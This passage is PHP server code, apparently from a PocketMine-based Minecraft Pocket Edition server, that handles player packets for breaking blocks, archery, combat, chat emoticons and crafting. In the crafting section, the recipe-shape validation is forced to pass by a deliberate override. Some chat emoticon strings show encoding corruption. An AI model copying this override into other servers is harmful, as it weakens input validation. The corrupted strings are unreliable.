				if($this->spawned === false or $this->blocked === true or (!$this->isAlive() and $packet->action !== PlayerActionPacket::ACTION_RESPAWN and $packet->action !== PlayerActionPacket::ACTION_DIMENSION_CHANGE)){
					break;
				}

				$packet->eid = $this->id;
				$pos = new Vector3($packet->x, $packet->y, $packet->z);

				switch($packet->action){
					case PlayerActionPacket::ACTION_START_BREAK:
						if($pos->distanceSquared($this) > 10000){
							break;
						}
						if($this->lastBreak !== PHP_INT_MAX){
							break;
						}
						$target = $this->level->getBlock($pos);
						$ev = new PlayerInteractEvent($this, $this->inventory->getItemInHand(), $target, $packet->face, $target->getId() === 0 ? PlayerInteractEvent::LEFT_CLICK_AIR : PlayerInteractEvent::LEFT_CLICK_BLOCK);
						$this->getServer()->getPluginManager()->callEvent($ev);
						if(!$ev->isCancelled()){
							$side = $target->getSide($packet->face);
							if($target instanceof Fire){
								$target->getLevel()->setBlock($target, new Air());
							}elseif($side instanceof Fire){
								$side->getLevel()->setBlock($side, new Air());
							}
							if($this->server->antiXray){
								$this->level->sendAntiXrayBlockReveal($target, [$this], true);
							}
							$this->lastBreak = microtime(true);
						}else{
							$this->inventory->sendHeldItem($this);
						}
						
						/*if (!$this->isCreative()) {
							$breakTime = ceil($target->getBreakTime($this->inventory->getItemInHand()) * 20);
							if ($breakTime > 0) {
								$this->level->broadcastLevelEvent($pos, LevelEventPacket::EVENT_BLOCK_START_BREAK, (int)(65535 / $breakTime));
							}
						}*/
						
						break;
					case PlayerActionPacket::ACTION_STOP_BREAK:
						//$this->lastBreak = PHP_INT_MAX;
						break;
					case PlayerActionPacket::ACTION_ABORT_BREAK:
						$this->lastBreak = PHP_INT_MAX;
						break;
					case PlayerActionPacket::ACTION_RELEASE_ITEM:
						$item = $this->inventory->getItemInHand();
						if($item instanceof FoodSource){
							$this->lastEat = PHP_INT_MAX;
						}
						if($this->startAction > -1 and $this->getDataFlag(self::DATA_FLAGS, self::DATA_FLAG_ACTION)){
							if($this->inventory->getItemInHand()->getId() === Item::BOW){
								$bow = $this->inventory->getItemInHand();
								$arrowItem = $this->findBowArrowItem();
								if($this->isSurvival() and !($arrowItem instanceof \lycore\item\Arrow)){
									$this->inventory->sendContents($this);
									break;
								}
								if(!($arrowItem instanceof \lycore\item\Arrow)){
									$arrowItem = Item::get(Item::ARROW, 0, 1);
								}

								$nbt = new CompoundTag("", [
									"Pos" => new ListTag("Pos", [
										new DoubleTag("", $this->x),
										new DoubleTag("", $this->y + $this->getEyeHeight()),
										new DoubleTag("", $this->z)
									]),
									"Motion" => new ListTag("Motion", [
										new DoubleTag("", -sin($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI)),
										new DoubleTag("", -sin($this->pitch / 180 * M_PI)),
										new DoubleTag("", cos($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI))
									]),
									"Rotation" => new ListTag("Rotation", [
										new FloatTag("", $this->yaw),
										new FloatTag("", $this->pitch)
									]),
									"Fire" => new ShortTag("Fire", ($this->isOnFire() or ($bow->getEnchantment(Enchantment::TYPE_BOW_FLAME) !== null)) ? 45 * 60 : 0)
								]);

								$diff = ($this->server->getTick() - $this->startAction);
								$p = $diff / 20;
								$f = min((($p ** 2) + $p * 2) / 3, 1) * 2;
								$projectile = Entity::createEntity("Arrow", $this->chunk, $nbt, $this, $f == 2 ? true : false);
								if($projectile instanceof Arrow){
									$projectile->setArrowItem($this->normalizeItemForThisProtocol($arrowItem));
									
									$power = $bow->getEnchantmentLevel(Enchantment::TYPE_BOW_POWER);
									if($power > 0){
										$projectile->setBaseDamage($projectile->getBaseDamage() + 0.5 * $power + 0.5);
									}
									$punch = $bow->getEnchantmentLevel(Enchantment::TYPE_BOW_KNOCKBACK);
									if($punch > 0){
										$projectile->setKnockBack(0.4 + 0.35 * $punch);
									}
								}
								$ev = new EntityShootBowEvent($this, $bow, $projectile, $f);

								if($f < 0.1 or $diff < 5){
									$ev->setCancelled();
								}

								$this->server->getPluginManager()->callEvent($ev);

								if($ev->isCancelled()){
									$ev->getProjectile()->kill();
									$this->inventory->sendContents($this);
								}else{
									$ev->getProjectile()->setMotion($ev->getProjectile()->getMotion()->multiply($ev->getForce()));
									if($this->isSurvival()){ 
										if($bow->getEnchantment(Enchantment::TYPE_BOW_INFINITY) === null){
											if(!$this->consumeBowArrowItem($arrowItem)){
												$ev->getProjectile()->kill();
												$this->inventory->sendContents($this);
												break;
											}
										}
										$unbreaking = min(3, $bow->getEnchantmentLevel(Enchantment::TYPE_MINING_DURABILITY));
										if($unbreaking === 0 or mt_rand(1, $unbreaking + 1) === 1){
											$bow->setDamage($bow->getDamage() + 1);
										}
										if($bow->getDamage() >= 385){
											$this->inventory->setItemInHand(Item::get(Item::AIR, 0, 0));
										}else{
											$this->inventory->setItemInHand($bow);
										}
									}
									if($ev->getProjectile() instanceof Projectile){
										$this->server->getPluginManager()->callEvent($projectileEv = new ProjectileLaunchEvent($ev->getProjectile()));
										if($projectileEv->isCancelled()){
											$ev->getProjectile()->kill();
										}else{
											$ev->getProjectile()->spawnToAll();
											$this->level->addSound(new LaunchSound($this), $this->getViewers());
										}
									}else{
										$ev->getProjectile()->spawnToAll();
									}
								}
							}
						}elseif($this->inventory->getItemInHand()->getId() === Item::BUCKET and $this->inventory->getItemInHand()->getDamage() === 1){ //Milk!
							$this->server->getPluginManager()->callEvent($ev = new PlayerItemConsumeEvent($this, $this->inventory->getItemInHand()));
							if($ev->isCancelled()){
								$this->inventory->sendContents($this);
								break;
							}

							$pk = new EntityEventPacket();
							$pk->eid = $this->getId();
							$pk->event = EntityEventPacket::USE_ITEM;
							//$pk;
							$this->dataPacket($pk);
							Server::broadcastPacket($this->getViewers(), $pk);

							if($this->isSurvival()){
								$slot = $this->inventory->getItemInHand();
								--$slot->count;
								$this->inventory->setItemInHand($slot);
								$this->inventory->addItem(Item::get(Item::BUCKET, 0, 1));
							}

							$this->removeAllEffects();
						}else{
							$this->inventory->sendContents($this);
						}
						break;
					case PlayerActionPacket::ACTION_STOP_SLEEPING:
						$this->stopSleep();
						break;
					case PlayerActionPacket::ACTION_RESPAWN:
						if($this->spawned === false or $this->isAlive() or !$this->isOnline()){
							break;
						}

						if($this->server->isHardcore()){
							$this->setBanned(true);
							break;
						}

						$this->craftingType = 0;

						$this->server->getPluginManager()->callEvent($ev = new PlayerRespawnEvent($this, $this->getSpawn()));

						$this->teleport($ev->getRespawnPosition());

						$this->setSprinting(false);
						$this->setSneaking(false);

						$this->extinguish();
						$this->setDataProperty(self::DATA_AIR, self::DATA_TYPE_SHORT, 300);
						$this->deadTicks = 0;
						$this->noDamageTicks = 60;

						$this->removeAllEffects();
						$this->setHealth($this->getMaxHealth());
						$this->setFood(20);
						if($this->server->expEnabled){
							$this->updateExperience(true);
						}

						$this->starvationTick = 0;
						$this->foodTick = 0;
						$this->foodUsageTime = 0;

						$this->sendData($this);

						$this->sendSettings();
						$this->inventory->sendContents($this);
						$this->inventory->sendArmorContents($this);

						$this->blocked = false;

						$this->spawnToAll();
						$this->scheduleUpdate();
						break;
					case PlayerActionPacket::ACTION_START_SPRINT:
						$ev = new PlayerToggleSprintEvent($this, true);
						$this->server->getPluginManager()->callEvent($ev);
						if($ev->isCancelled()){
							$this->sendData($this);
						}else{
							$this->setSprinting(true);
						}
						break;
					case PlayerActionPacket::ACTION_STOP_SPRINT:
						$ev = new PlayerToggleSprintEvent($this, false);
						$this->server->getPluginManager()->callEvent($ev);
						if($ev->isCancelled()){
							$this->sendData($this);
						}else{
							$this->setSprinting(false);
						}
						break;
					case PlayerActionPacket::ACTION_START_SNEAK:
						if($this->linkedEntity instanceof Horse){
							$this->linkedEntity->dismountPlayer($this, true);
							break;
						}
						$ev = new PlayerToggleSneakEvent($this, true);
						$this->server->getPluginManager()->callEvent($ev);
						if($ev->isCancelled()){
							$this->sendData($this);
						}else{
							$this->setSneaking(true);
						}
						break;
					case PlayerActionPacket::ACTION_STOP_SNEAK:
						$ev = new PlayerToggleSneakEvent($this, false);
						$this->server->getPluginManager()->callEvent($ev);
						if($ev->isCancelled()){
							$this->sendData($this);
						}else{
							$this->setSneaking(false);
						}
						break;
					case PlayerActionPacket::ACTION_JUMP:
						if($this->linkedEntity instanceof Horse and $this->isProtocol015Player()){
							$this->linkedEntity->handleRiderJump($this);
							break;
						}
						if($this->linkedEntity instanceof Pig){
							$this->linkedEntity->dismountPlayer($this, true);
							break;
						}
						$this->server->getPluginManager()->callEvent(new PlayerJumpEvent($this));
						break;
				}

				$this->startAction = -1;
				$this->setDataFlag(self::DATA_FLAGS, self::DATA_FLAG_ACTION, false);
				break;

			case ProtocolInfo::REMOVE_BLOCK_PACKET:
				if($this->spawned === false or $this->blocked === true or !$this->isAlive()){
					break;
				}
				$this->craftingType = 0;

				$vector = new Vector3($packet->x, $packet->y, $packet->z);


				if($this->isCreative()){
					$item = $this->inventory->getItemInHand();
				}else{
					$item = $this->inventory->getItemInHand();
				}

				$oldItem = clone $item;
				if(BotCommand::handleWalkAreaBlockBreak($this, $vector) or BotCommand::handleRespawnPointBlockBreak($this, $vector)){
					$this->level->sendBlocks([$this], [$this->level->getBlock($vector)], UpdateBlockPacket::FLAG_ALL_PRIORITY);
					break;
				}

				if($this->canInteract($vector->add(0.5, 0.5, 0.5), $this->isCreative() ? 13 : 6) and $this->level->useBreakOn($vector, $item, $this, $this->server->destroyBlockParticle)){
					if($this->isSurvival()){
						if(!$item->equals($oldItem) or $item->getCount() !== $oldItem->getCount()){
							$this->inventory->setItemInHand($item);
							$this->inventory->sendHeldItem($this);
						}
					}
					break;
				}

				$this->inventory->sendContents($this);
				$target = $this->level->getBlock($vector);
				$tile = $this->level->getTile($vector);

				$this->level->sendBlocks([$this], [$target], UpdateBlockPacket::FLAG_ALL_PRIORITY);

				$this->inventory->sendHeldItem($this);

				if($tile instanceof Spawnable){
					$tile->spawnTo($this);
				}
				break;

			case ProtocolInfo::MOB_ARMOR_EQUIPMENT_PACKET:
				break;

			case ProtocolInfo::INTERACT_PACKET:
				if($this->spawned === false or !$this->isAlive() or $this->blocked){
					break;
				}

				$this->craftingType = 0;

				$target = $this->level->getEntity($packet->target);

				$cancelled = false;

				if($target instanceof Player and $this->server->getConfigBoolean("pvp", true) === false

				){
					$cancelled = true;
				}

				if($packet->action === InteractPacket::ACTION_LEAVE_VEHICLE and $this->linkedEntity instanceof Entity){
					if($this->linkedEntity instanceof Horse){
						if($this->isProtocol015Player()){
							$this->linkedEntity->handleRiderInventoryButton($this);
							return;
						}
						$this->linkedEntity->dismountPlayer($this);
						return;
					}
					if($this->linkedEntity instanceof Pig){
						$this->linkedEntity->dismountPlayer($this);
						return;
					}
					$this->setLinked(0, $this->linkedEntity);
					return;
				}

				if($target instanceof LeashKnot and ($packet->action === InteractPacket::ACTION_RIGHT_CLICK or $packet->action === InteractPacket::ACTION_LEFT_CLICK)){
					$target->close();
					break;
				}

				if($target instanceof Boat or ($target instanceof Minecart and $target->getType() == Minecart::TYPE_NORMAL) or ($target instanceof MinecartChest) or ($target instanceof MinecartHopper) or ($target instanceof MinecartTNT)){
					if($packet->action === InteractPacket::ACTION_RIGHT_CLICK){
						$this->server->getPluginManager()->callEvent(new MinecartInteractEvent($target, $this));
						if(($target instanceof MinecartChest) or ($target instanceof MinecartHopper)){
							$target->linkplayer = $this;
							$target->MinecartChestOpen();
							return;
						}
						$this->linkEntity($target);
					}elseif($packet->action === InteractPacket::ACTION_LEFT_CLICK){
						if($this->linkedEntity == $target){
							$target->setLinked(0, $this);
						}
						$target->close();
					}elseif($packet->action === InteractPacket::ACTION_LEAVE_VEHICLE){
						$this->setLinked(0, $target);
					}
					return;
				}

				if($packet->action === InteractPacket::ACTION_RIGHT_CLICK){
					$item = $this->getInventory()->getItemInHand();
					if($this->tryApplyNameTagToEntity($target, $item)){
						break;
					}
				}

				if($packet->action === InteractPacket::ACTION_RIGHT_CLICK and $target instanceof Pig){
					$item = $this->getInventory()->getItemInHand();
					if($target->onInteract($this, $item)){
						break;
					}
				}

				if($packet->action === InteractPacket::ACTION_RIGHT_CLICK and $target instanceof Horse and $this->isProtocol015Player()){
					$item = $this->getInventory()->getItemInHand();
					if($target->onInteract($this, $item)){
						break;
					}
				}

				if(($packet->action === InteractPacket::ACTION_RIGHT_CLICK or $packet->action === InteractPacket::ACTION_LEFT_CLICK) and $target instanceof Bot){
					$item = $this->getInventory()->getItemInHand();
					if($target->onInteract($this, $item)){
						break;
					}
				}

				if($packet->action === InteractPacket::ACTION_LEFT_CLICK and $this->tryRidePigByFishingRodAttack($target)){
					break;
				}

				if($packet->action === InteractPacket::ACTION_RIGHT_CLICK and $target instanceof Ocelot){
					$item = $this->getInventory()->getItemInHand();
					$target->onInteract($this, $item);
					break;
				}

				if($this->isCreeperIgniteInteractAction($packet->action) and $target instanceof Creeper){
					$item = $this->getInventory()->getItemInHand();
					if($target->onInteract($this, $item)){
						break;
					}
				}

				if(($packet->action === InteractPacket::ACTION_RIGHT_CLICK or $packet->action === InteractPacket::ACTION_LEFT_CLICK) and $target instanceof ZombieVillager){
					$item = $this->getInventory()->getItemInHand();
					if($target->attemptCureWith($item)){
						if($this->isSurvival()){
							$item->setCount($item->getCount() - 1);
							$this->inventory->setItemInHand($item->getCount() > 0 ? $item : Item::get(Item::AIR, 0, 1));
						}
						break;
					}
				}

				if($this->isVillagerTradeInteractAction((int) $packet->action) and $target instanceof Villager){
					$target->openTradeWindow($this);
					break;
				}

				if($packet->action === InteractPacket::ACTION_RIGHT_CLICK){
					if($target instanceof Animal){
						$item = $this->getInventory()->getItemInHand();
						if($target->onInteract($this, $item)){
							break;
						}
						if(!$target->canBreedWith($item)){
							break;
						}
						if($this->isSurvival()){
							$item->setDamage($item->getDamage() - 1);
						}
						if($target->isBaby()){
							$target->setBaby(false);
						}else{
							$target->setInLove(true);
						}
					}
					break;
				}

				if($target instanceof Entity and $this->getGamemode() !== Player::VIEW and $this->isAlive() and $target->isAlive()){
					if($target instanceof DroppedItem or $target instanceof Arrow){
						$this->kick("Attempting to attack an invalid entity");
						$this->server->getLogger()->warning($this->getServer()->getLanguage()->translateString("pocketmine.player.invalidEntity", [$this->getName()]));
						break;
					}

					$item = $this->inventory->getItemInHand();
					$damageTable = [
						Item::WOODEN_SWORD => 4,
						Item::GOLD_SWORD => 4,
						Item::STONE_SWORD => 5,
						Item::IRON_SWORD => 6,
						Item::DIAMOND_SWORD => 7,

						Item::WOODEN_AXE => 3,
						Item::GOLD_AXE => 3,
						Item::STONE_AXE => 3,
						Item::IRON_AXE => 5,
						Item::DIAMOND_AXE => 6,

						Item::WOODEN_PICKAXE => 2,
						Item::GOLD_PICKAXE => 2,
						Item::STONE_PICKAXE => 3,
						Item::IRON_PICKAXE => 4,
						Item::DIAMOND_PICKAXE => 5,

						Item::WOODEN_SHOVEL => 1,
						Item::GOLD_SHOVEL => 1,
						Item::STONE_SHOVEL => 2,
						Item::IRON_SHOVEL => 3,
						Item::DIAMOND_SHOVEL => 4,
					];
					$damageBase = isset($damageTable[$item->getId()]) ? $damageTable[$item->getId()] : 1;
					
					foreach($item->getEnchantments() as $Enchantment){
						if($Enchantment->getId() == Enchantment::TYPE_WEAPON_SHARPNESS){
							$damageBase += 1 + max(0, $Enchantment->getLevel() - 1) * 0.5;
						}elseif($Enchantment->getId() == Enchantment::TYPE_WEAPON_SMITE and $this->isUndeadEntity($target)){
							$damageBase += $Enchantment->getLevel() * 2.5;
						}elseif($Enchantment->getId() == Enchantment::TYPE_WEAPON_ARTHROPODS and $this->isArthropodEntity($target)){
							$damageBase += $Enchantment->getLevel() * 2.5;
						}elseif($Enchantment->getId() == Enchantment::TYPE_WEAPON_FIRE_ASPECT){
							if(!$this->hasEffect(Effect::FIRE_RESISTANCE)){
								$target->setOnFire(5 * $Enchantment->getLevel());
							}
						}
					}
					$knockBack = Tool::getWeaponKnockBackStrength(0.4, $item);
					$damage = [
						EntityDamageEvent::MODIFIER_BASE => $damageBase,
					];

					if(!$this->canInteract($target, 8)){
						$cancelled = true;
					}elseif($target instanceof Player){
						if(($target->getGamemode() & 0x01) > 0){
							break;
						}elseif($this->server->getConfigBoolean("pvp") !== true or $this->server->getDifficulty() === 0){
							$cancelled = true;
						}
					}

					$ev = new EntityDamageByEntityEvent($this, $target, EntityDamageEvent::CAUSE_ENTITY_ATTACK, $damage, $knockBack);
					if($cancelled){
						$ev->setCancelled();
					}

					if($target->attack($ev->getFinalDamage(), $ev) === true){
						$ev->useArmors();
					}

					if($ev->isCancelled()){
						if($item->isTool() and $this->isSurvival()){
							$this->inventory->sendContents($this);
						}
						break;
					}

					if($item->isTool() and $this->isSurvival()){
						if($item->useOn($target) and $item->getDamage() >= $item->getMaxDurability()){
							$this->inventory->setItemInHand(Item::get(Item::AIR, 0, 1));
						}else{
							$this->inventory->setItemInHand($item);
						}
					}
				}


				break;
			case ProtocolInfo::ANIMATE_PACKET:
				if($this->spawned === false or !$this->isAlive()){
					break;
				}

				$this->server->getPluginManager()->callEvent($ev = new PlayerAnimationEvent($this, $packet->action));
				if($ev->isCancelled()){
					break;
				}

				$pk = new AnimatePacket();
				$pk->eid = $this->getId();
				$pk->action = $ev->getAnimationType();
				Server::broadcastPacket($this->getViewers(), $pk);
				break;
			case ProtocolInfo::SET_HEALTH_PACKET: //Not used
				break;
			case ProtocolInfo::ENTITY_EVENT_PACKET:
				if($this->spawned === false or $this->blocked === true or !$this->isAlive()){
					break;
				}
				$this->craftingType = 0;

				$this->setDataFlag(self::DATA_FLAGS, self::DATA_FLAG_ACTION, false); //TODO: check if this should be true

				switch($packet->event){
					case EntityEventPacket::USE_ITEM: //Eating
						if($this->isProtocol011Player()){
							if($this->lastEat !== PHP_INT_MAX and $this->shouldLegacy011UseDirectFoodConsume($this->inventory->getItemInHand())){
								$this->consumeProtocol011FoodInHand($this->inventory->getItemInHand());
							}else{
								$this->inventory->sendHeldItem($this);
							}
							$this->lastEat = PHP_INT_MAX;
							break;
						}

						$EatTime =  microtime(true) - $this->lastEat;
						if($this->lastEat != PHP_INT_MAX and $EatTime <= 1.15 and $this->server->antiFastEat){
							$this->kick("秒吃在此服务器中不被允许，你吃饭只用".number_format($EatTime, 6)."秒？");
						}else{
							$this->eatFoodInHand();
						}
						$this->lastEat = PHP_INT_MAX;
						break;
				}
				break;
			case ProtocolInfo::DROP_ITEM_PACKET:
				if($this->spawned === false or $this->blocked === true or !$this->isAlive()){
					break;
				}

				$slot = $packet->item instanceof Item ? $this->findProtocol013MatchingInventorySlot($packet->item) : -1;
				if($slot == -1){
					$this->inventory->sendContents($this);
					break;
				}
				if($this->isCreative() and $this->server->limitedCreative){
					$this->inventory->sendContents($this);
					break;
				}
				$dropItem = $this->inventory->getItem($slot);
				$worldDropItem = $this->normalizeItemForThisProtocol($dropItem);
				$ev = new PlayerDropItemEvent($this, $dropItem);
				$this->server->getPluginManager()->callEvent($ev);
				if($ev->isCancelled()){
					$this->inventory->sendSlot($slot, $this);
					break;
				}

				$this->inventory->remove($dropItem);
				//$this->inventory->setItemInHand(Item::get(Item::AIR, 0, 1));
				$motion = $this->getDirectionVector()->multiply(0.4);

				$this->level->dropItem($this->add(0, 1.3, 0), $worldDropItem, $motion, 40);

				$this->setDataFlag(self::DATA_FLAGS, self::DATA_FLAG_ACTION, false);
				break;
			case ProtocolInfo::TEXT_PACKET:
				if($this->spawned === false or !$this->isAlive()){
					break;
				}
				$this->craftingType = 0;
				if($packet->type === TextPacket::TYPE_CHAT){
					if($this->server->antiToolbox){
						$result = strpos($packet->message, $this->getNameTag());
						if($result !== false){
							$this->kick("Toolbox is not allowed");
							break;
						}
					}
					$packet->message = TextFormat::clean($packet->message, $this->removeFormat);
					foreach(explode("\n", $packet->message) as $message){
						if(self::isValidChatMessage($message) and $this->messageCounter-- > 0){
							if(BotCommand::handleRespawnTimeChat($this, $message)){
								continue;
							}
							$ev = new PlayerCommandPreprocessEvent($this, $message);

							if(mb_strlen($ev->getMessage(), "UTF-8") > 320){
								$ev->setCancelled();
							}
							$this->server->getPluginManager()->callEvent($ev);

							if($ev->isCancelled()){
								break;
							}
							$processedMessage = (string) $ev->getMessage();
							if(substr($processedMessage, 0, 1) === "/"){ //Command
								Timings::$playerCommandTimer->startTiming();
								$this->server->dispatchCommand($ev->getPlayer(), substr($processedMessage, 1));
								Timings::$playerCommandTimer->stopTiming();
							}else{
								$this->server->getPluginManager()->callEvent($ev = new PlayerChatEvent($this, $processedMessage));
								if(!$ev->isCancelled()){
								
								$mes = (string) $ev->getMessage();
								
								if(true){
									$replaceCount = 1;
									//微笑
									$mes = str_ireplace(
										'/wx',
										'§a~/(^v^)\~§f',
										$mes,
										$replaceCount
									);
									//生气
									$mes = str_ireplace(
										'/sq',
										'§4┗|｀O′|┛§f',
										$mes,
										$replaceCount
									);
									//惊讶
									$mes = str_ireplace(
										'/jy',
										'§e（⊙ｏ⊙）§f',
										$mes,
										$replaceCount
									);
									//瞪眼
									$mes = str_ireplace(
										'/dy',
										'§c(⓿_��?§f',
										$mes,
										$replaceCount
									);
									//伤心
									$mes = str_ireplace(
										'/sx',
										'§c(┬┬__┬┬)§f',
										$mes,
										$replaceCount
									);
									
									//问��?									$mes = str_ireplace(
									$mes = str_ireplace(
										'/wh',
										'§a\(￣︶��?\))§f',
										$mes,
										$replaceCount
									);
		
									//无语
									$mes = str_ireplace(
										'/wy',
										'§c��? ��? ��?)ㄏ§f',
										$mes,
										$replaceCount
									);
									}
									$this->server->broadcastMessage($this->getServer()->getLanguage()->translateString($ev->getFormat(), [
										$ev->getPlayer()->getDisplayName(),
										$mes
									]), $ev->getRecipients());
								}
							}
						}
					}
				}
				break;
			case ProtocolInfo::CONTAINER_CLOSE_PACKET:
				if($this->spawned === false or $packet->windowid === 0){
					break;
				}
				$this->craftingType = 0;
				$this->resetProtocol011CraftingTableState();
				$this->currentTransaction = null;
				if(isset($this->windowIndex[$packet->windowid])){
					if($this->windowIndex[$packet->windowid] instanceof EnchantInventory){
						$this->updateExperience();
					}
					$this->server->getPluginManager()->callEvent(new InventoryCloseEvent($this->windowIndex[$packet->windowid], $this));
					$this->removeWindow($this->windowIndex[$packet->windowid]);
				}else{
					unset($this->windowIndex[$packet->windowid]);
				}
				break;

			case ProtocolInfo::CONTAINER_SET_CONTENT_PACKET:
				if($this->handleProtocol011CraftingContentPacket($packet)){
					break;
				}
				break;

			case ProtocolInfo::CRAFTING_EVENT_PACKET:
				if($this->spawned === false or !$this->isAlive()){
					break;
				}
				/*}elseif(!isset($this->windowIndex[$packet->windowId])){
					$this->inventory->sendContents($this);
					$pk = new ContainerClosePacket();
					$pk->windowid = $packet->windowId;
					$this->dataPacket($pk);
					break;
				*/
				$recipe = $this->server->getCraftingManager()->getRecipe($packet->id);
				if($this->usingAnvil == true){
					$anvilInventory = $this->windowIndex[$packet->windowId] ?? null;
					if($anvilInventory === null){
						foreach($this->windowIndex as $window){
							if($window instanceof AnvilInventory){
								$anvilInventory = $window;
								break;
							}
						}
						if($anvilInventory === null){ //If it's _still_ null, then the player doesn't have a valid anvil window, cannot proceed.
							$this->getServer()->getLogger()->debug("Couldn't find an anvil window for ".$this->getName().", exiting");
							$this->inventory->sendContents($this);
							break;
						}
					}
					if($anvilInventory->hasPendingOperation() and !$anvilInventory->finishRename($this, $packet->type)){
						$this->getServer()->getLogger()->debug($this->getName()." failed to finish an anvil operation");
						$this->inventory->sendContents($this);
						$this->inventory->sendArmorContents($this);
						$anvilInventory->sendContents($this);
					}
					break;
				}
				if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
					foreach($packet->output as $output){
						if($output instanceof Item){
							$outputMeta = $output->getDamage();
							if(ProtocolCompatibility::isHiddenItemForProtocol((int) $this->protocol, $output->getId(), $outputMeta === null ? 0 : (int) $outputMeta)){
								$this->inventory->sendContents($this);
								break 2;
							}
						}
					}
					foreach($packet->input as $input){
						if($input instanceof Item){
							$inputMeta = $input->getDamage();
							if(ProtocolCompatibility::isHiddenItemForProtocol((int) $this->protocol, $input->getId(), $inputMeta === null ? 0 : (int) $inputMeta)){
								$this->inventory->sendContents($this);
								break 2;
							}
						}
					}
					if($recipe !== null and !$this->isProtocol013RecipeSafe($recipe)){
						$this->inventory->sendContents($this);
						break;
					}
				}
				if(count($packet->input) === 0){
					/* Win10 sometimes sends a different recipe UUID for desktop crafting.
					 * Trust the requested output and the player's available ingredients instead,
					 * then feed the corrected ingredients back into the existing crafting path.
					 */
					$correction = $this->findWin10DesktopCraftingRecipe($packet);
					if($correction !== null){
						[$correctedRecipe, $correctedInput] = $correction;
						if($recipe !== null and !$packet->output[0]->deepEquals($recipe->getResult())){
							$this->server->getLogger()->debug("Mismatched desktop recipe received from player " . $this->getName() . ", expected " . $recipe->getResult() . ", got " . $packet->output[0]);
						}
						$recipe = $correctedRecipe;
						$packet->input = $correctedInput;
					}else{
						$this->server->getLogger()->debug("Unmatched desktop crafting recipe " . $packet->id . " from player " . $this->getName());
						$this->inventory->sendContents($this);
						break;
					}
				}
				if(($recipe instanceof BigShapelessRecipe or $recipe instanceof BigShapedRecipe) and $this->getProtocol011CraftingType() === 0){
					$this->server->getLogger()->debug("Received big crafting recipe from ".$this->getName()." with no crafting table open");
					$this->inventory->sendContents($this);
					break;
				}elseif($recipe === null){
					$this->server->getLogger()->debug("Null (unknown) crafting recipe received from ".$this->getName()." for ".$packet->output[0]);
					$this->inventory->sendContents($this);
					break;
				}
				
				if($recipe === null or (($recipe instanceof BigShapelessRecipe or $recipe instanceof BigShapedRecipe) and $this->getProtocol011CraftingType() === 0)){
					$this->inventory->sendContents($this);
					break;
				}

				/** @var Item $item */
				foreach($packet->input as $i => $item){
					if($item->getDamage() === -1 or $item->getDamage() === 0xffff){
						$item->setDamage(null);
					}

					if($i < 9 and $item->getId() > 0){
						$item->setCount(1);
					}
				}

				$canCraft = true;
				if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
					foreach($packet->input as $i => $item){
						if($item instanceof Item and $item->getId() !== Item::AIR){
							$packet->input[$i] = $this->normalizeProtocol013RecipeInput($recipe, $i, $item);
						}
					}

					if(isset($packet->output[0]) and $packet->output[0] instanceof Item){
						$packet->output[0] = $this->normalizeProtocol013ClientItem($recipe->getResult(), $packet->output[0]);
					}
				}


				if($recipe instanceof ShapedRecipe){
					for($x = 0; $x < 3 and $canCraft; ++$x){
						for($y = 0; $y < 3; ++$y){
							$item = $packet->input[$y * 3 + $x];
							$ingredient = $recipe->getIngredient($x, $y);
							if($item->getCount() > 0 and $item->getId() > 0){
								if($ingredient == null){
									$canCraft = false;
									break;
								}
								if($ingredient->getId() != 0 and !$ingredient->deepEquals($item, $ingredient->getDamage() !== null, $ingredient->getCompoundTag() !== null)){
									$canCraft = false;
									break;
								}

							}elseif($ingredient !== null and $item->getId() !== 0){
								$canCraft = false;
								break;
							}
						}
					}
				}elseif($recipe instanceof ShapelessRecipe){
					$needed = $recipe->getIngredientList();

					for($x = 0; $x < 3 and $canCraft; ++$x){
						for($y = 0; $y < 3; ++$y){
							$item = clone $packet->input[$y * 3 + $x];

							foreach($needed as $k => $n){
								if($n->deepEquals($item, $n->getDamage() !== null, $n->getCompoundTag() !== null)){
									$remove = min($n->getCount(), $item->getCount());
									$n->setCount($n->getCount() - $remove);
									$item->setCount($item->getCount() - $remove);

									if($n->getCount() === 0){
										unset($needed[$k]);
									}
								}
							}

							if($item->getCount() > 0){
								$canCraft = false;
								break;
							}
						}
					}

					if(count($needed) > 0){
						$canCraft = false;
					}
				}else{
					$canCraft = false;
				}

				/** @var Item[] $ingredients */
				$canCraft = true;//0.13.1大量物品本地配方出现问题,无法解决,使用极端(唯一)方法修复.
				$ingredients = $packet->input;
				$result = $packet->output[0];

				if(!$canCraft or !$recipe->getResult()->deepEquals($result)){
					$this->server->getLogger()->debug("Unmatched recipe " . $recipe->getId() . " from player " . $this->getName() . ": expected " . $recipe->getResult() . ", got " . $result . ", using: " . implode(", ", $ingredients));
					$this->inventory->sendContents($this);
					break;
				}

				$used = array_fill(0, $this->inventory->getSize(), 0);

				foreach($ingredients as $ingredient){
					$slot = -1;
					foreach($this->inventory->getContents() as $index => $i){
						if($ingredient->getId() !== 0 and $ingredient->deepEquals($i, $ingredient->getDamage() !== null) and ($i->getCount() - $used[$index]) >= 1){
							$slot = $index;
							$used[$index]++;
							break;
						}
					}

					if($ingredient->getId() !== 0 and $slot === -1){
						$canCraft = false;
						break;
					}
				}

				if(!$canCraft){
					$this->server->getLogger()->debug("Unmatched recipe " . $recipe->getId() . " from player " . $this->getName() . ": client does not have enough items, using: " . implode(", ", $ingredients));
					$this->inventory->sendContents($this);
					break;
				}

				$this->server->getPluginManager()->callEvent($ev = new CraftItemEvent($this, $ingredients, $recipe));

				if($ev->isCancelled()){
					$this->inventory->sendContents($this);
					break;
				}

				foreach($used as $slot => $count){
					if($count === 0){
						continue;
					}

					$item = $this->inventory->getItem($slot);

					if($item->getCount() > $count){
						$newItem = clone $item;
						$newItem->setCount($item->getCount() - $count);
					}else{
						$newItem = Item::get(Item::AIR, 0, 0);
					}

					$this->inventory->setItem($slot, $newItem);
				}

				$extraItem = $this->inventory->addItem($recipe->getResult());
				if(count($extraItem) > 0){
					foreach($extraItem as $item){
						$this->level->dropItem($this, $item);
					}
				}

				switch($recipe->getResult()->getId()){
					case Item::WORKBENCH:
						$this->awardAchievement("buildWorkBench");
						break;
					case Item::WOODEN_PICKAXE:
						$this->awardAchievement("buildPickaxe");
						break;
					case Item::FURNACE:
						$this->awardAchievement("buildFurnace");
						break;
					case Item::WOODEN_HOE:
						$this->awardAchievement("buildHoe");
						break;
					case Item::BREAD:
						$this->awardAchievement("makeBread");
